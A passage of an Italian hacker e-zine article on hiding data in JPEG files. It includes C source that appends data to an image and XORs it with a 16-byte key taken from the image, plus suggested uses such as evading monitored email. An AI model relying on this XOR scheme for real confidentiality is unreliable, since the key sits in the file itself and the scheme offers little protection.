+printf("Dati necessari per estrarre i dati:\n\nByte: %d\nPad : %d\n", file1lung, startpad);
+
+fclose(file1);
+fclose(file2);
+fclose(file3);
+
+}
+
+void cript (char *buff, char *pad, int lung)
+{
+int h;
+
+for (h=0;h<lung;h++)
+ {
+  buff[h]^=pad[h%16];
+ }
+}
+<-X->
+
+<-| jpg/JPG-Split.c |->
+/*
+<---------------------------------------------------------------------------->
+<-    __   ___   _       ----->>----          JPG-Split.c           ----<<--->
+<-   /  \ |   \ | | /\   ---                                                ->
+<-  / /\ \| |\ \| |/ /   ---         Sorgente allegato all'articolo         ->  
+<- / /__\ \    /|   /    ---        "Nascondere dati in un file JPG"        ->
+<- \______/ |\ \| | \    ---                                                ->
+<-        |_| \_\_|\_\   ---------------------------------------------------->
+<---------------------------------------------------------------------------->
+*/
+#include <stdio.h>
+
+void decript (char *, char *, int);
+
+main(int argc, char *argv[]) 
+{
+FILE *file1, *file2;
+char *tutto, pad[16];
+long file1lung, file2lung, file3lung;
+
+if (argc<5)
+ {
+   printf("USO: %s file1 file2 num:\n",argv[0]);
+   printf("file1 - file JPG\n");
+   printf("file2 - nome del file di Output\n");
+   printf("Bytes - numero di byte dell'immagine originale\n");
+   printf("Pad   - numero iniziale del pad\n");
+   exit(-1);
+ }
+
+file1 = fopen(argv[1], "r");
+if (file1 == NULL) 
+ {
+   printf("Errore di apertura nel file %s\n",argv[1]);
+   exit(-1);
+ }
+
+file2 = fopen(argv[2], "w");
+if (file2 == NULL) 
+ {
+   printf("Errore di apertura nel file %s\n",argv[2]);
+   exit(-1);
+ }
+
+/* Trova la lunghezza dei 3 files */
+
+fseek(file1, 0, SEEK_END);
+file1lung = ftell(file1);
+file2lung = atoi(argv[3]);
+file3lung = file1lung-file2lung;
+
+if (file2lung>file1lung) 
+ {
+   printf("Parametro \"Bytes\" sbagliato\n");
+   exit(-1);
+ }
+
+/* Legge solo la parte dei dati criptati */
+
+rewind(file1);
+fseek(file1, file2lung, SEEK_CUR);
+tutto = (char *) malloc(file3lung);
+fread(tutto, 1, file3lung, file1);
+
+/* Crea la chiave che servira' per decriptare i dati */
+
+rewind(file1);
+fseek(file1, atoi(argv[4]), SEEK_CUR);
+fread(pad, 1, 16, file1);
+
+/* Decripta i dati */
+
+decript(tutto, pad, file3lung);
+
+/* Salva i dati sul file  */
+
+fwrite (tutto, 1, file3lung, file2);
+
+fclose(file1);
+fclose(file2);
+
+}
+
+void decript (char *buff, char *pad, int lung)
+{
+int h;
+
+for (h=0;h<lung;h++)
+ {
+  buff[h]^=pad[h%16];
+ }
+}
+<-X->
+
+4 - I possibili impieghi
+------------------------
+Gli impieghi possibili di questa tecnica sono limitati solamente dalla
+fantasia di chi ne fa uso. Alcuni suggerimenti possono essere i seguenti.
+Immaginate di avere la necessita' di rendere disponibili dei dati attraverso 
+Internet, in modo da poterli recuperare dovunque vi troviate. Questi dati
+pero' sono altamente confidenziali e non volete che altre persone, oltre a voi
+e ai vostri fidatissimi amici, ne vengano in possesso. Quale miglior 
+nascondiglio potreste trovare rispetto alla sezione "Foto della gita in 
+montagna" della vostra Home Page??? Sicuramente questa sara' la sezione piu'
+noiosa e meno visitata del vostro sito e sicuramente nessuno pensera' che una
+delle 100 foto di voi con la vostra ragazza che camminate in mezzo alle pecore
+contenga una sorpresina :)
+Immaginate oppure di dover far avere delle informazioni private ad un vostro 
+amico attraverso un supporto fisico (tipo un CD) e sapete che nel tragitto
+probabilmente passera' per mani indiscrete. Cosa c'e' meglio di una bella 
+directory con un migliaio di foto XXX???
+Altra applicazione possibile si puo' avere nel caso in cui si abbia la 
+sensazione di avere la casella di posta elettronica controllata. Invece
+di cambiare indirizzo e-mail o cominciare a criptare le mail (cose che 
+darebbero nell'occhio) basta accordarsi con l'interlocutore per lo scrivere 
+cose semi-inutili nel corpo della mail e allegare un'immagine che in realta'
+avra' lo scopo di contenere le informazioni importanti.
+
+Chiaramente questa tecnica ha anche pesanti limiti, non e' possibili infatti 
+distribuire grosse quantita' di dati. Sicuramente uno che si trova di fronte
+ad un file JPG di 50 MB si insospettisce come minimo.
+
+5 - Riferimenti
+---------------
+[1] - "CRYX's note about the JPEG decoding algorithm" 
+       Writed by Cristi Cuturicu (cccrx@kermit.cs.pub.ro)
+
+<---------------------------------------------------------------------------->
+<------------------- ** Information wants to be Free !! ** ------------------>
+<---------------------------------------------------------------------------->
+<------------------------------------------------------------------ By ORK -->
+<---------------------------------------------------------------------------->
+
+
+==============================================================================
+--------------------------------[ EOF  5/18 ]---------------------------------
+==============================================================================
